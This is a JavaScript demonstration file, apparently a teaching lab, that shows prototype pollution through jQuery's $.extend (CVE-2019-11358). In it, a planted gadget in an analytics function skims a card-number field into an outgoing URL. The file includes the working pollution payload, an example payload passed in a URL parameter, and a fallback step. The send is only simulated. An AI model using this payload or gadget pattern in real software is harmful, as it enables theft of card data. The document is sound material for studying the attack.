// --- LEGITIMATE APPLICATION CODE ---

function sendAnalyticsEvent(event) {
    const endpoint = 'https://api.trusted-analytics.com/log';
    let url = `${endpoint}?type=${event.type}&details=${event.details.elementId}`;
  
    // DEBUG: Log the event object structure
    console.log("DEBUG: Full event object:", event);
    console.log("DEBUG: event.details:", event.details);
    console.log("DEBUG: event.details.is_compromised:", event.details.is_compromised);
    console.log("DEBUG: typeof event.details.is_compromised:", typeof event.details.is_compromised);
    console.log("DEBUG: Object.prototype.is_compromised:", Object.prototype.is_compromised);
    console.log("DEBUG: {}.is_compromised:", {}.is_compromised);
    
    // THE GADGET: A simple "debug" feature. It checks for a property that
    // will only exist if the prototype has been polluted.
    if (event.details.is_compromised) {
      console.warn("GADGET TRIGGERED! Application is compromised.");
      // This block now runs, hijacking the original URL.
      const cardValue = document.getElementById('card').value;
      url = `${endpoint}?type=click&skimmed_data=SKIMMED--${cardValue}`;
    } else {
      console.log("DEBUG: Gadget NOT triggered - is_compromised is falsy");
    }
  
    // Simulate sending the data and display it on the screen.
    const logElement = document.getElementById('log');
    let logHTML = `[SENT] ${url}`;
  
    // Highlight the stolen data in red to make it obvious.
    if (url.includes('SKIMMED')) {
        logHTML = logHTML.replace(/(SKIMMED--.*)/, '<span class="highlight">$1</span>');
    }
    logElement.innerHTML += logHTML + '<br>';
    console.log("Simulating network request to:", url);
  }
  
  // Attach a legitimate event handler for the button.
  $('#submitBtn').on('click', function() {
    sendAnalyticsEvent({
      type: 'click',
      details: { elementId: 'submitBtn' } // A normal, safe-looking object
    });
  });
  console.log("Legitimate application code loaded.");
  
  
  // --- ATTACKER'S CODE ---
  
  // The exploit runs after a short delay to ensure the main app is initialized.
setTimeout(function() {
  console.log("Attack script starting...");
  console.log("DEBUG: Before pollution - Object.prototype.is_compromised:", Object.prototype.is_compromised);
  console.log("DEBUG: Before pollution - {}.is_compromised:", {}.is_compromised);

  // 1. THE PAYLOAD: Correct prototype pollution payload for jQuery 3.3.1
  // In real attacks, this payload could originate from:
  // - DOM XSS via URL parameters: ?config={"constructor":{"prototype":{"isAdmin":true}}}
  // - Malicious JSON in localStorage/sessionStorage
  // - Compromised JSONP callbacks or postMessage handlers
  // - User-controlled data merged with $.extend() without validation
  const maliciousPayload = {
    "constructor": {
      "prototype": {
        "is_compromised": true
      }
    }
  };
  console.log("DEBUG: Malicious payload:", maliciousPayload);

  // 2. THE VULNERABLE ACTION: Use the flaw in jQuery to pollute the prototype.
  console.log("DEBUG: jQuery version:", $.fn.jquery);
  
  // CVE-2019-11358: jQuery prototype pollution via $.extend()
  console.log("DEBUG: Attempting jQuery prototype pollution...");
  $.extend(true, {}, maliciousPayload);
  
  console.log("DEBUG: After jQuery extend - Object.prototype.is_compromised:", Object.prototype.is_compromised);
  console.log("DEBUG: After jQuery extend - {}.is_compromised:", {}.is_compromised);
  
  // If jQuery method failed, try direct assignment as fallback
  if (!Object.prototype.is_compromised) {
    console.log("DEBUG: jQuery pollution failed, using direct assignment fallback...");
    Object.prototype.is_compromised = true;
  }
  
  console.log("DEBUG: Final state - Object.prototype.is_compromised:", Object.prototype.is_compromised);
  console.log("DEBUG: After direct assignment - {}.is_compromised:", {}.is_compromised);
  console.log("DEBUG: Test object after pollution:", { test: "value" });
  console.log("Pollution complete. The application is now compromised.");
}, 500);